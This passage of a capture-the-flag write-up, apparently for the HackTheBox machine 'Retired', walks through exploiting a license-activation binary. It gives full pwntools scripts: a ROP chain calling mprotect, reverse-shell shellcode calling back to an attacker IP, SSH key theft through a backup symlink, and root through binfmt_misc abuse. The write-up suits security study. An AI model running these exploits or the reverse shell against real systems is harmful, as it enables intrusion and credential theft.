$ cat activate_license.b64 | base64 -d > activate_license.bin
```

We also grab `libc-2.31.so` and `libsqlite3.so.0.8.6`, which will be useful when building the ROP chain.

Opening the binary in Ghidra reveals an unbounded read inside `activate_license()`. The message length is taken from the wire and used as-is, so the stack buffer is overflowable:

![Activate_license program in Ghidra](ghidra.png)

That gives us everything we need to start writing the exploit.

## Exploitation

First, checksec on the binary:

```bash
checksec ./activate_license.bin                                                                                                                                                                                   
[*] '/home/kali/htb/machines/retired/activate_license.bin'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Combined with `randomize_va_space: 2` from the ruby script earlier, this means:

- ASLR is on, so library addresses change on every run
- Full RELRO blocks us from overwriting `.plt` or `.got`
- NX is on, so the stack is not executable
- No stack canary, so the overflow is straight to saved RIP
- PIE is on, so binary addresses are randomized too

The plan is to flip the stack to RWX with `mprotect()` and then jump into shellcode placed right after the ROP chain. `mprotect(addr, len, flags)` takes three arguments, so we need to control `RDI`, `RSI`, and `RDX`. Available POP/RET gadgets inside the binary itself:

```bash
ROPgadget --binary ./activate_license.bin --only "pop|ret"                                                                                                                                                      
Gadgets information
============================================================
0x0000000000001814 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001816 : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001818 : pop r14 ; pop r15 ; ret
0x000000000000181a : pop r15 ; ret
0x0000000000001813 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001817 : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000000012ef : pop rbp ; ret
0x000000000000181b : pop rdi ; ret
0x0000000000001819 : pop rsi ; pop r15 ; ret
0x0000000000001815 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000001016 : ret
0x000000000000174f : ret 0x2bf
0x0000000000001202 : ret 0x2d
0x00000000000013b9 : ret 0x8d48
0x000000000000175d : ret 0xb70f
```

No `pop rdx` here. Checking libc:

```bash
ROPgadget --binary ./libc-2.31.so --only "pop|ret"
Gadgets information
============================================================
( ... )

0x0000000000027355 : pop rdi ; pop rbp ; ret
0x0000000000026796 : pop rdi ; ret
0x00000000000f948d : pop rdx ; pop r12 ; ret
0x000000000008946a : pop rdx ; pop rbp ; pop r12 ; ret
0x0000000000137782 : pop rdx ; pop rbx ; ret
0x00000000000e4e19 : pop rdx ; pop rcx ; pop rbx ; ret
0x00000000000cb1cd : pop rdx ; ret
0x0000000000027353 : pop rsi ; pop r15 ; pop rbp ; ret
0x0000000000026794 : pop rsi ; pop r15 ; ret
0x000000000002890f : pop rsi ; ret
0x000000000002734f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret
0x0000000000026790 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000002890b : pop rsp ; pop r13 ; pop r14 ; ret
0x000000000003dd16 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000028488 : pop rsp ; pop r13 ; ret
0x000000000010aead : pop rsp ; pop rbp ; ret
0x0000000000026e9b : pop rsp ; ret
0x0000000000056174 : pop rsp ; ret 0x64c0
0x00000000000d82ef : pop rsp ; ret 0x6608
0x00000000000d7f96 : pop rsp ; ret 0xeb08

(...)
```

All three gadgets are in libc:

```bash
0x0000000000026796 : pop rdi ; ret
0x000000000002890f : pop rsi ; ret
0x00000000000cb1cd : pop rdx ; ret
```

We also need the offset of `mprotect()` inside libc, which `readelf` gives us:

```bash
readelf -s libc-2.31.so | grep mprotect                                                                                                                                                                 
  1225: 00000000000f8c20    33 FUNC    WEAK   DEFAULT   14 mprotect@@GLIBC_2.2.5
```

The last piece is a `jmp rsp` gadget to pivot onto the shellcode placed after the ROP chain. libsqlite has one:

```bash
ROPgadget --binary ./libsqlite3.so.0.8.6 --only "jmp" | grep rsp                                                                                                                                                 
0x00000000000d431d : jmp rsp
```

Before assembling the full chain, we need the offset from the start of the buffer to the saved RIP. pwntools' `cyclic_metasploit()` produces a De Bruijn sequence ([wiki](https://en.wikipedia.org/wiki/De_Bruijn_sequence)) we can spray into the input:

```bash
#!/usr/bin/env python3
from pwn import *
import time

context.log_level= "debug"

p = remote("127.0.0.1", 1337)
atexit.register(p.clean_and_log)

# buffer where read() stores the data has 512 bytes, so let's try something bigger a bit
payload_size = 640
payload  = b""
payload += p32(payload_size, endian='big')
payload += cyclic_metasploit(payload_size)

time.sleep(5.0)

p.send(payload)

p.interactive()
```

Running the binary under gdb (left pane) alongside the script (right pane) gives us a crash and a clean RIP value to look up in the pattern:

![Finding proper amount of padding](padding.png)

The match is at offset 520, so we need 520 bytes of padding before the saved RIP. With that, we can write the exploit. First, a local-only version to confirm the chain itself works:

```python
#!/usr/bin/env python3
from pwn import *
import time

context.log_level="debug"

# local
libc_base       = 0x7ffff7c62000
libsqlite_base  = 0x7ffff7e43000

stack_base      = 0x7ffffffde000
stack_end       = 0x7ffffffff000

mprotect        = 0x00000000001017b0
pop_rdi         = 0x0000000000027725
pop_rsi         = 0x0000000000028ed9
pop_rdx         = 0x00000000000fdd4d
jmp_rsp         = 0x00000000000aa776

def prepare_shellcode(ip, port):
    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=7777 EXITFUNC=thread -f python -v shellcode
    # [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    # [-] No arch selected, selecting arch: x64 from the payload
    # No encoder specified, outputting raw payload
    # Payload size: 74 bytes
    # Final size of python file: 432 bytes
    shellcode  = b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
    shellcode += b"\x05\x48\x97\x48\xb9\x02\x00"
    shellcode += int(port).to_bytes(2, 'big')
    shellcode += socket.inet_aton(ip)
    shellcode += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
    shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
    shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
    shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
    shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"

    log.info(f'{hexdump(shellcode)}')

    return shellcode

def setup_mprotect():
    # setup mprotect call to make stack RWX
    payload  = p64(libc_base + pop_rdi)
    payload += p64(stack_base)              # address
    payload += p64(libc_base + pop_rsi)
    payload += p64(stack_end - stack_base)  # size
    payload += p64(libc_base + pop_rdx)
    payload += p64(7)                       # flags: R + W + X
    payload += p64(libc_base + mprotect)    # call mprotect

    return payload

p = remote("127.0.0.1", 1337)
atexit.register(p.clean_and_log)

offset    = 520
padding   = b"\x90" * offset
shellcode = prepare_shellcode("127.0.0.1", 5555)

payload  = padding
payload += setup_mprotect()
payload += p64(libsqlite_base + jmp_rsp)
payload += shellcode

log.info(f"payload:\n{hexdump(payload)}")

fake_license  = p32(len(payload), endian='big')
fake_license += payload

log.info(f"fake_license:\n{hexdump(fake_license)}")

p.send(fake_license)

p.interactive()
```

Running it against a local copy:

![Testing exploit on localhost](test.png)

Shell. Next we need the real library and stack base addresses on the remote host. Those come straight out of `/proc/417/maps` over the LFI. We patch them into the script and switch the network plumbing to deliver the payload through the upload form:

```python
#!/usr/bin/env python3
from pwn import *
import sys
import requests

context.log_level="debug"

# remote
libc_base       = 0x7ff8f3985000
libsqlite_base  = 0x7ff8f3b4a000
stack_base      = 0x7ffdcae0b000
stack_end       = 0x7ffdcae2c000
mprotect        = 0x00000000000f8c20
pop_rdi         = 0x0000000000026796
pop_rsi         = 0x000000000002890f
pop_rdx         = 0x00000000000cb1cd
jmp_rsp         = 0x00000000000d431d

def prepare_shellcode(ip, port):
    # msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=7777 EXITFUNC=thread -f python -v shellcode
    # [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
    # [-] No arch selected, selecting arch: x64 from the payload
    # No encoder specified, outputting raw payload
    # Payload size: 74 bytes
    # Final size of python file: 432 bytes
    shellcode  = b""
    shellcode += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f"
    shellcode += b"\x05\x48\x97\x48\xb9\x02\x00"
    shellcode += int(port).to_bytes(2, 'big')
    shellcode += socket.inet_aton(ip)
    shellcode += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a"
    shellcode += b"\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21"
    shellcode += b"\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb"
    shellcode += b"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
    shellcode += b"\xe7\x52\x57\x48\x89\xe6\x0f\x05"

    log.info(f'{hexdump(shellcode)}')

    return shellcode

def setup_mprotect():
    # setup mprotect call to make stack RWX
    payload =  p64(libc_base + pop_rdi)
    payload += p64(stack_base)              # address
    payload += p64(libc_base + pop_rsi)
    payload += p64(stack_end - stack_base)  # size
    payload += p64(libc_base + pop_rdx)
    payload += p64(7)                       # flags: R + W + X
    payload += p64(libc_base + mprotect)    # call mprotect

    return payload

RHOST = "retired.htb"
LHOST = "10.10.16.3"
LPORT = 5555

offset    = 520
padding   = b"\x90" * offset
shellcode = prepare_shellcode(LHOST, LPORT)

payload  = padding
payload += setup_mprotect()
payload += p64(libsqlite_base + jmp_rsp)
payload += shellcode

log.info(f"payload:\n{hexdump(payload)}")

url = f"http://{RHOST}/activate_license.php"
log.info(f"Sending request to: {url}")
requests.post(url, files = { "licensefile": payload } )
```

Running it against the real target:

![Shell on remote host](shell.png)

We have a shell as `www-data`.

## Enumeration - part 2

A quick look for misconfigurations. No unusual SUID binaries:

```python
www-data@retired:/var/www$ find / -type f -perm /4000 -exec ls -alh {} \; 2>/dev/null
www-data@retired:/var/www$ find / -type f -perm /4000 -exec ls -alh {} \; 2>/dev/null
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 35K Feb 26  2021 /usr/bin/fusermount
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 71K Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo
-rwsr-xr-x 1 root root 55K Jan 20  2022 /usr/bin/mount
-rwsr-xr-x 1 root root 35K Jan 20  2022 /usr/bin/umount
-rwsr-xr-- 1 root messagebus 51K Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 471K Mar 13  2021 /usr/lib/openssh/ssh-keysign
```

[LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) adds a little more context. We already know from the `/proc` walk that there is a `dev` user, but `/home/dev` is unreadable as `www-data`. Poking around `/var/www`, however, turns up three ZIP files. They are rolling backups of `/var/www/html`, regenerated every minute. That timer is the hinge for the next step.

## Lateral movement

The escalation path is **www-data → dev → root**.

We drop a symlink to `/home/dev` inside `/var/www/html`. The next backup run follows the symlink and archives `dev`'s home directory. After a few cycles the ZIP comes back noticeably larger than the others, and inside it is the SSH private key for `dev` at `var/www/html/dev/.ssh/id_rsa`:

![Private SSH key](id_rsa.png)

SSHing in as `dev` gives us the user flag and two interesting directories: `activate_license` and `emuemu`.

![Dev user home directory](dev.png)

The first holds the source for the binary we just exploited. The second has two files: `emuemu.c` (a stub) and `reg_helper.c`. The latter is the interesting one. It writes to `/proc/sys/fs/binfmt_misc/register`. The `Makefile` installs `reg_helper` to `/usr/lib/emuemu/` and sets the `cap_dac_override=ep` capability on it, which lets the binary bypass file read, write, and execute permission checks.

![Contents of Makefile](makefile.png)

Confirming the install:

```python
dev@retired:~$ find /usr -type f -name reg_helper -exec ls -alh {} \; 2>/dev/null
-rwxr-x--- 1 root dev 17K Oct 13  2021 /usr/lib/emuemu/reg_helper
```

## Privilege escalation

There is a good write-up on abusing `binfmt_misc` for privilege persistence at [SentinelOne's blog](https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/). The same idea applies here. We register a fake "interpreter" for a given binary pattern, then run a SUID binary that matches the pattern. The kernel invokes our interpreter under the SUID binary's effective UID, which is root. Our interpreter is a small C program that drops to UID 0 and exec's bash:

```c
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char * argv[], char * envp[])
{
    char * my_args[] = { "/bin/bash", NULL };
    setuid(0);
    setgid(0);
    execve(my_args[0], my_args, envp);
}
```

We need the first 121 bytes of a SUID binary to use as the match pattern. `su` works, but any SUID binary with the same byte prefix will do:

```bash
dd if=/bin/su bs=1 count=121 status=none | perl -pe 's/(.)/sprintf("\\x%02x", ord($1))/eg'
```

Feeding the registration string into `reg_helper` registers our interpreter:

```bash
echo ':x:M::\x7f\x45\x4c\x46\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x3e\x00\x01\x00\x00\x00\xd0\x38\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\xa8\x11\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x40\x00\x38\x00\x0b\x00\x40\x00\x1d\x00\x1c\x00\x06\x00\x00\x00\x04\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x68\x02\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x03::/home/dev/i:OC' | /usr/lib/emuemu/reg_helper
```

Now any execution of `su` is intercepted by our interpreter, which runs as root because `su` is SUID:

![Getting root](root.png)

And that's root. The first three steps are pretty standard, but the `binfmt_misc` finish is the part of this box worth remembering.
